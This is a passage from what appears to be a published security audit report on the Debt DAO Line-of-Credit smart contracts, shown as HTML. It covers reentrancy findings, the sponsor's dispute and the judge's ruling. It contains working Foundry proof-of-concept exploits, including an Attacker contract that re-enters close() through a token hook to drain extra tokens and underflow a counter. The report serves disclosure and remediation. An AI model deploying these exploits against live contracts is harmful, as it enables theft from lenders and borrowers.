class=\"grvsc-source\">        tokenUsed.approve(address(line), lenderOneAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.depositAndRepay(lenderOneAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.close(id_first);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        //validate that lender1 was able to steal lender2 tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assert(tokenUsed.balanceOf(address(lenderOneContract)) == lenderOneAmount + lenderTwoAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>To run the POC execute:\n<code>forge test -v</code></p>\n<p>Expected output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] test_reentrancy() (gas: 1636410)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Test result: ok. 1 passed; 0 failed; finished in 1.71ms</span></span></code></pre>\n<p>To get full trace execute:\n<code>forge test -vvvv</code></p>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Foundry.</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Send tokens only at the end of <code>_close(Credit memory credit, bytes32 id)</code> or add a reentrancyGuard.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/160#issuecomment-1332394657\">kibagateaux (Debt DAO) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>Similar comments to <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/176\">#176</a>. Both Lenders would have to agree to use tokens that have inherent reentrancy attacks built into the token. This issue feels much more valid than the other one.</p>\n<p>In my opinion its not valid to say “if you add malicious things, malicious things happen”. If I didn’t want token reentrancy attacks, I simply wouldn’t add tokens with explicit arbitrary reentrancy abilities.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/160#issuecomment-1340012972\">dmvt (judge) commented</a>:</strong></p>\n<blockquote>\n<p>That line of reasoning doesn’t hold up. The user should be protected against accidentally allowing a token that has a reentrancy attack vector. There is not an immediate and obvious difference between ERC777 and ERC20 tokens. This issue has been a viable Medium risk going all the way back to Uniswap V2 (or possibly before).</p>\n</blockquote>\n<hr>\n<h2 id=\"m-06-the-lender-can-draw-out-extra-credit-token-from-borrowers-account\" style=\"position:relative;\"><a href=\"#m-06-the-lender-can-draw-out-extra-credit-token-from-borrowers-account\" aria-label=\"m 06 the lender can draw out extra credit token from borrowers account permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/176\">[M-06] The lender can draw out extra credit token from borrower’s account</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/176\">KingNFT</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/337\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/332\">adriro</a>, and <a href=\"https://github.com/code-423n4/2022-11-debtdao-findings/issues/311\">Ch_301</a></em></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388</a></p>\n<p><a href=\"https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488\">https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L488</a></p>\n<h3 id=\"impact-8\" style=\"position:relative;\"><a href=\"#impact-8\" aria-label=\"impact 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>When the credit token is ERC20 extensive with hook, such as ERC777 token, the lender can exploit it to draw out extra tokens from borrower’s account. And the <code>count</code> state variable would also be underflowed, cause the line contract can’t be ‘REPAID’, the borrower will never be able to get back the collateral.</p>\n<p>P.S.</p>\n<p><a href=\"https://zengo.com/imbtc-defi-hack-explained\">Similar attack on imBTC</a></p>\n<h3 id=\"proof-of-concept-11\" style=\"position:relative;\"><a href=\"#proof-of-concept-11\" aria-label=\"proof of concept 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The vulnerable point is in <code>\\_close()</code> function,</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (credit.deposit + credit.interestRepaid &gt; 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LineLib.sendOutTokenOrETH( // @audit reentrancy attack from here</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            credit.token,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            credit.lender,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            credit.deposit + credit.interestRepaid</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // ...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The following testcase shows how to exploit it, put it into a new LenderExploit.t.sol file under ‘test’ directory, it will pass</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity 0.8.9;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;forge-std/Test.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Denominations } from &quot;chainlink/Denominations.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Address } from &quot;openzeppelin/utils/Address.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Spigot } from &quot;../modules/spigot/Spigot.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { Escrow } from &quot;../modules/escrow/Escrow.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { SecuredLine } from &quot;../modules/credit/SecuredLine.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { ILineOfCredit } from &quot;../interfaces/ILineOfCredit.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { ISecuredLine } from &quot;../interfaces/ISecuredLine.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { LineLib } from &quot;../utils/LineLib.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { MutualConsent } from &quot;../utils/MutualConsent.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { MockLine } from &quot;../mock/MockLine.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { SimpleOracle } from &quot;../mock/SimpleOracle.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import { RevenueToken } from &quot;../mock/RevenueToken.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">interface IHook {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function tokensReceived(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract RevenueTokenWithHook is RevenueToken {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    using Address for address;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mapping(address =&gt; bool) public registry;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _afterTokenTransfer(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address from,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 amount</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) internal virtual override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        super._afterTokenTransfer(from, to, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (registry[to]) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            IHook(to).tokensReceived(from, to, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function registerHook(address addr) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        registry[addr] = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract Attacker is IHook {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 constant ATTACK_COUNT = 10;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    SecuredLine line;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address borrower;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    RevenueTokenWithHook token;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 count;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    bool attackEnable;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    constructor(address line_, address borrower_, address token_) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line = SecuredLine(payable(line_));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        borrower = borrower_;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token = RevenueTokenWithHook(token_);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token.registerHook(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function tokensReceived(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            address,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            uint256</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (msg.sender != address(token)) return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (!attackEnable) return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 count_ = count;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (count_ &gt;= ATTACK_COUNT) return;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        count = count_ + 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32 id = line.ids(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (uint256 deposit,,,,,,) = line.credits(id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        token.transfer(address(line), deposit);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.close(id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function enableAttack() external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        attackEnable = true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract ExploitCloseFunctionTest is Test {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 constant ONE_YEAR = 365.25 days;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 constant ATTACK_COUNT = 10;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Escrow escrow;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Spigot spigot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    RevenueTokenWithHook supportedToken1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    RevenueToken supportedToken2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    RevenueToken unsupportedToken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    SimpleOracle oracle;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    SecuredLine line;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint mintAmount = 100 ether;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint32 minCollateralRatio = 10000; // 100%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint128 dRate = 100;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint128 fRate = 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint ttl = ONE_YEAR;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address borrower;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address arbiter;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address lender;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function setUp() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        borrower = address(20);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        arbiter = address(this);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken1 = new RevenueTokenWithHook();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken2 = new RevenueToken();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unsupportedToken = new RevenueToken();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        spigot = new Spigot(arbiter, borrower, borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        oracle = new SimpleOracle(address(supportedToken1), address(supportedToken2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        escrow = new Escrow(minCollateralRatio, address(oracle), arbiter, borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line = new SecuredLine(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          address(oracle),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          arbiter,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          borrower,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          payable(address(0)),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          address(spigot),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          address(escrow),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          ONE_YEAR,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        lender = address(new Attacker(address(line), borrower, address(supportedToken1)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(supportedToken1.registry(lender), true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        escrow.updateLine(address(line));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        spigot.updateOwner(address(line));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(uint(line.init()), uint(LineLib.STATUS.ACTIVE));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _mintAndApprove();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        escrow.enableCollateral( address(supportedToken1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        escrow.enableCollateral( address(supportedToken2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">   </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        escrow.addCollateral(1 ether, address(supportedToken2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testExpoit() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _addCredit(address(supportedToken1), 1 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes32 id = line.ids(0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.warp(line.deadline() - ttl / 2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.accrueInterest();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (uint256 deposit, , uint256 interestAccrued, , , , ) = line.credits(id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 lenderBalanceBefore = supportedToken1.balanceOf(lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 lenderBalanceAfterExpected = lenderBalanceBefore + deposit + interestAccrued;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Attacker(lender).enableAttack();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        hoax(lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.close(id);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 lenderBalanceAfter = supportedToken1.balanceOf(lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(lenderBalanceAfter, lenderBalanceAfterExpected + interestAccrued * ATTACK_COUNT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        (uint256 count,) = line.counts();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(count, MAX_INT - ATTACK_COUNT + 1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _mintAndApprove() internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        deal(lender, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken1.mint(borrower, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken1.mint(lender, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken2.mint(borrower, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken2.mint(lender, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unsupportedToken.mint(borrower, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unsupportedToken.mint(lender, mintAmount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken1.approve(address(escrow), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken1.approve(address(line), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken2.approve(address(escrow), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken2.approve(address(line), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unsupportedToken.approve(address(escrow), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unsupportedToken.approve(address(line), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken1.approve(address(escrow), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken1.approve(address(line), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken2.approve(address(escrow), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        supportedToken2.approve(address(line), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unsupportedToken.approve(address(escrow), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unsupportedToken.approve(address(line), MAX_INT);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _addCredit(address token, uint256 amount) public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        hoax(borrower);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.addCredit(dRate, fRate, amount, token, lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        hoax(lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        line.addCredit(dRate, fRate, amount, token, lender);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    receive() external payable {}</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>Related links:</p>\n<p><a 